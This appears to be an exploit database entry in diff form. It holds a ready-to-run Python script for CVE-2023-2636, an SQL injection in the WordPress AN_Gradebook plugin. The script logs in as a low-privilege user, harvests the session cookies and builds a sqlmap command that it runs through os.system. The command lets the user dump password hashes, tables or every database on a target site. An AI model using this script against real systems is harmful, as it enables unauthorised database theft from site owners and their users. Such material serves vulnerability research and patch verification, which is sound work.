@@ -1,0 +1,106 @@
+id: 38913
+date: 07/28/2023
+title: WordPress AN_Gradebook 5.0.1 Plugin - SQL injection Vulnerability
+author: Lukas Kinneberg
+cves: CVE-2023-2636
+
+#!/usr/bin/python3
+
+# Exploit Title: WordPress Plugin AN_Gradebook <= 5.0.1 - Subscriber+ SQLi
+# Date: 2023-07-26
+# Exploit Author: Lukas Kinneberg
+# Github: https://github.com/lukinneberg/CVE-2023-2636
+# Vendor Homepage: https://wordpress.org/plugins/an-gradebook/
+# Software Link: https://github.com/lukinneberg/CVE-2023-2636/blob/main/an-gradebook.7z
+# Tested on: WordPress 6.2.2
+# CVE: CVE-2023-2636
+
+
+from datetime import datetime
+import os
+import requests
+import json
+
+# User Input:
+target_ip = 'CHANGE_THIS'
+target_port = '80'
+username = 'hacker'
+password = 'hacker'
+
+banner = '''
+
+ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ 
+||C |||V |||E |||- |||2 |||0 |||2 |||3 |||- |||2 |||6 |||3 |||6 ||
+||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||
+|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
+		Exploit Author: Lukas Kinneberg
+
+'''
+
+print(banner)
+
+print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
+
+# Authentication:
+session = requests.Session()
+auth_url = 'http://' + target_ip + ':' + target_port + '/wp-login.php'
+check = session.get(auth_url)
+# Header:
+header = {
+    'Host': target_ip,
+    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
+    'Accept-Encoding': 'gzip, deflate',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Origin': 'http://' + target_ip,
+    'Connection': 'close',
+    'Upgrade-Insecure-Requests': '1'
+}
+
+# Body:
+body = {
+    'log': username,
+    'pwd': password,
+    'wp-submit': 'Log In',
+    'testcookie': '1'
+}
+auth = session.post(auth_url, headers=header, data=body)
+
+# SQL-Injection (Exploit):
+# Generate payload for sqlmap
+cookies_session = session.cookies.get_dict()
+cookie = json.dumps(cookies_session)
+cookie = cookie.replace('"}','')
+cookie = cookie.replace('{"', '')
+cookie = cookie.replace('"', '')
+cookie = cookie.replace(" ", '')
+cookie = cookie.replace(":", '=')
+cookie = cookie.replace(',', '; ')
+
+print('[*] Payload for SQL-Injection:')
+
+# Enter the URL path of the course after the target_port below
+exploitcode_url = r'sqlmap -u "http://' + target_ip + ':' + target_port + r'/wp-admin/admin-ajax.php?action=course&id=3" '
+exploitcode_risk = '--level 2 --risk 2 '
+exploitcode_cookie = '--cookie="' + cookie + '" '
+
+
+# SQLMAP Printout
+print('    Sqlmap options:')
+print('     -a, --all           Retrieve everything')
+print('     -b, --banner        Retrieve DBMS banner')
+print('     --current-user      Retrieve DBMS current user')
+print('     --current-db        Retrieve DBMS current database')
+print('     --passwords         Enumerate DBMS users password hashes')
+print('     --tables            Enumerate DBMS database tables')
+print('     --columns           Enumerate DBMS database table column')
+print('     --schema            Enumerate DBMS schema')
+print('     --dump              Dump DBMS database table entries')
+print('     --dump-all          Dump all DBMS databases tables entries')
+retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
+exploitcode = exploitcode_url + exploitcode_risk + exploitcode_cookie + retrieve_mode + ' -p id -v 0 --answers="follow=Y" --batch'
+os.system(exploitcode)
+print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
+
+#  0day.today [2023-08-05]  #
